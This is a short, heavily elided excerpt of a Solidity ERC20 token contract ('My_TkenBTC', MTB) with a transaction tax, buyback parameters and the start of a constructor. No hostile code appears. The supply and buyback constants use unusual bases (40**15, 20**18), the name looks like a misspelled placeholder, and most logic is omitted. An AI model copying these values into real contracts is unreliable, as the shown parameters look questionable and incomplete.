...
contract GRV is ERC20Detailed, Ownable {
    ...
    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 40**15 * 10**DECIMALS;

    uint256 public transactionTax = 981;
    uint256 public buybackLimit = 20 ** 18;
    uint256 public buybackDivisor = 200;
    uint256 public numTokensSellDivisor = 40000;
    ...
    constructor (address router, address payable _marketingAddress)
        ERC20Detailed("My_TkenBTC", "MTB", uint8(DECIMALS))
        payable
        public
    {
